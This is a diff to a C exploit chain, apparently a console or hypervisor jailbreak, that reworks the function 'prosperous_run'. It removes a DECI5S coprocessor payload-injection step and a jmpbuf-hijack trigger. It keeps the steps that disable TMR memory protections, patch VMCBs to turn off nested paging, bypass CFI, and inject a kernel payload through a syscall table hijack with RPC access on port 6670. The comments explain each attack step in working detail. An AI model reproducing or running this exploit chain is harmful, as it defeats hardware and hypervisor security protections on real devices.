@@ -202,24 +202,20 @@ int prosperous_run(void)
         return ret;
     }
 
-    /* Phase 1: MP4 payload injection via DECI5S.
+    /* Phase 1: TMR bypass
      *
-     * This MUST happen BEFORE TMR disable because the A53 firmware
-     * needs to be running stably to process DECI5S commands.
-     * DECI5S has the A53 write to its own DRAM internally, which
-     * completely bypasses x86 nested page table restrictions.
+     * Disable TMR 20 (MP4 DRAM protection) and create TMR 21 to cover
+     * the gap. Re-enable TMR 20 immediately — we only need it briefly
+     * disabled for the TMR bypass init. The A53 accesses its own DRAM
+     * through IOMMU, not through x86 TMR.
+     *
+     * NOTE: We no longer inject an A53 payload or use DECI5S for code
+     * execution. The I-cache coherency problem (DECI5S writes update
+     * D-cache/DRAM but not I-cache) makes A53 code patches unreliable.
+     * Instead, we access HV memory directly from x86 via DMAP after
+     * TMR bypass — no A53 involvement needed.
      */
-    printf("\n[*] Phase 1: MP4 payload injection via DECI5S...\n");
-
-    ret = deci5s_inject_payload(&ctx);
-    if (ret != 0) {
-        printf("[!] DECI5S payload injection failed: %d\n", ret);
-        return ret;
-    }
-    printf("[+] MP4 payload injected via DECI5S\n");
-
-    /* Phase 2: TMR bypass */
-    printf("\n[*] Phase 2: TMR bypass...\n");
+    printf("\n[*] Phase 1: TMR bypass...\n");
 
     ret = tmr_bypass_init(&ctx);
     if (ret != 0) {
@@ -228,94 +224,11 @@ int prosperous_run(void)
     }
     printf("[+] TMR 20 disabled, TMR 21 created\n");
 
-    /* Re-enable TMR 20 immediately (matches original prosperous flow).
-     * The A53 accesses its own DRAM through its IOMMU, not through x86 TMR.
-     * Leaving TMR 20 disabled causes kernel panics on game restart.
-     * The payload is already written via DECI5S, so we no longer need
-     * x86 access to MP4 DRAM. */
     tmr_restore_tmr20(&ctx);
     printf("[+] TMR 20 restored\n");
 
-    /* Wait for bootstrap to fire via jmpbuf hijack.
-     *
-     * The jmpbuf trigger is armed: qword_123180 != 0. However, the firmware
-     * only checks qword_123180 during the SYSHUB Violation handler (GIC IRQ 33),
-     * NOT during normal timer interrupts. We must deliberately trigger a SYSHUB
-     * violation by doing an x86 read of TMR-protected MP4 DRAM.
-     *
-     * Access path: x86 → DMAP → PA 0x60000000 → SB → TMR check → BLOCKED
-     *   → SYSHUB violation interrupt (IRQ 33) → A53 exception handler
-     *   → checks qword_123180 != 0 → longjmp → bootstrap → IC IALLU
-     *
-     * TMR 20 is still active at this point, so the read will be blocked
-     * (returns garbage) but the violation interrupt fires on the A53.
-     */
-    /* Trigger SYSHUB violation via DECI5S to fire the jmpbuf bootstrap.
-     *
-     * SYSHUB violations (GIC IRQ 33) are generated when the A53 itself
-     * accesses an unmapped SYSHUB address — NOT by x86 reading TMR memory.
-     *
-     * We use DECI5S READ_MEMORY with EL3_VA_TO_EL3_VA access type to make
-     * the A53 read from VA 0x70000000. This address:
-     *   - Passes the EL3 MMU check (AT S1E3R succeeds)
-     *   - Fails at the SYSHUB TLB (no mapping → violation)
-     *   - Fires GIC IRQ 33 → exception handler checks qword_123180
-     *   - qword_123180 is armed → longjmp to bootstrap → IC IALLU
-     *
-     * The DECI5S read will timeout (A53 longjmps out of the handler),
-     * which is expected — the side effect (I-cache flush) is the goal.
-     */
-    printf("[*] Triggering SYSHUB violation via DECI5S VA read...\n");
-    for (int attempt = 0; attempt < 5; attempt++) {
-        uint32_t dummy = 0;
-        printf("[*] DECI5S read of unmapped VA 0x70000000 (attempt %d/5)...\n",
-               attempt + 1);
-        int trigger_ret = deci5s_read_el3_va(0x70000000ULL, &dummy, 4);
-        printf("[DIAG] DECI5S VA read returned %d (timeout expected)\n",
-               trigger_ret);
-
-        usleep(500000); /* 500ms for A53 to process the violation + bootstrap */
-
-        uint64_t jmpbuf_check = 0xDEAD;
-        deci5s_read_mem(A53_DRAM_PA_BASE + A53_JMPBUF_PTR_OFF, &jmpbuf_check, 8);
-        printf("[DIAG] qword_123180 = 0x%llx %s\n",
-               (unsigned long long)jmpbuf_check,
-               jmpbuf_check == 0 ? "(CLEARED — bootstrap ran!)" : "(still armed)");
-        if (jmpbuf_check == 0) {
-            printf("[+] Bootstrap IC IALLU confirmed — I-cache flushed!\n");
-            break;
-        }
-    }
-
-    /* Brief additional wait for thunk to become active after I-cache flush */
-    usleep(500000);
-
-    /* Diagnostic: c2p reg 0 state */
-    {
-        intptr_t bar2 = (intptr_t)(ctx.dmap_base + MP4_BAR2_PA);
-        uint32_t c2p0_val = kernel_getint(bar2 + MP4_C2P_REG(0, 0));
-        printf("[DIAG] c2p reg 0: 0x%08x\n", c2p0_val);
-        uint32_t p2c0_val = kernel_getint(bar2 + MP4_P2C_REG0(0));
-        printf("[DIAG] p2c reg 0: 0x%08x\n", p2c0_val);
-    }
-
-    /* Verify MP4 payload is alive (retry a few times) */
-    for (int attempt = 0; attempt < 5; attempt++) {
-        ret = mp4_ping(&ctx);
-        if (ret == 0)
-            break;
-        printf("[*] MP4 ping attempt %d failed, retrying...\n", attempt + 1);
-        usleep(500000);
-    }
-    if (ret != 0) {
-        printf("[!] MP4 payload not responding after retries\n");
-        tmr_restore_hv_regions(&ctx);
-        return ret;
-    }
-    printf("[+] MP4 payload ping OK\n");
-
-    /* Phase 3: Disable HV TMR protections */
-    printf("\n[*] Phase 3: Disabling HV TMR protections...\n");
+    /* Phase 2: Disable HV TMR protections */
+    printf("\n[*] Phase 2: Disabling HV TMR protections...\n");
 
     ret = tmr_disable_hv_regions(&ctx);
     if (ret != 0) {
@@ -325,8 +238,12 @@ int prosperous_run(void)
     }
     printf("[+] HV TMR protections disabled\n");
 
-    /* Phase 4: VMCB patching */
-    printf("\n[*] Phase 4: VMCB patching (disabling nested paging)...\n");
+    /* Phase 3: VMCB patching — directly via DMAP (no A53 needed)
+     *
+     * With HV TMRs disabled, x86 can access VMCB structures directly
+     * via DMAP. No SYSHUB TLB setup or A53 code execution required.
+     */
+    printf("\n[*] Phase 3: VMCB patching (disabling nested paging)...\n");
 
     ret = vmcb_patch_disable_np(&ctx);
     if (ret != 0) {
@@ -336,8 +253,8 @@ int prosperous_run(void)
     }
     printf("[+] Nested paging disabled on all VMCBs\n");
 
-    /* Phase 5: CFI bypass */
-    printf("\n[*] Phase 5: CFI bypass...\n");
+    /* Phase 4: CFI bypass */
+    printf("\n[*] Phase 4: CFI bypass...\n");
 
     ret = cfi_bypass(&ctx);
     if (ret != 0) {
@@ -347,13 +264,13 @@ int prosperous_run(void)
     }
     printf("[+] CFI check_fail patched\n");
 
-    /* Phase 6: Restore TMR protections */
-    printf("\n[*] Phase 6: Restoring TMR protections...\n");
+    /* Phase 5: Restore TMR protections */
+    printf("\n[*] Phase 5: Restoring TMR protections...\n");
     tmr_restore_hv_regions(&ctx);
     printf("[+] TMR protections restored\n");
 
-    /* Phase 7: Kernel payload injection */
-    printf("\n[*] Phase 7: Kernel payload injection...\n");
+    /* Phase 6: Kernel payload injection */
+    printf("\n[*] Phase 6: Kernel payload injection...\n");
     printf("[*] kpayload will be injected via syscall table hijack.\n");
     printf("[*] After injection, connect to port 6670 for RPC access.\n");
 
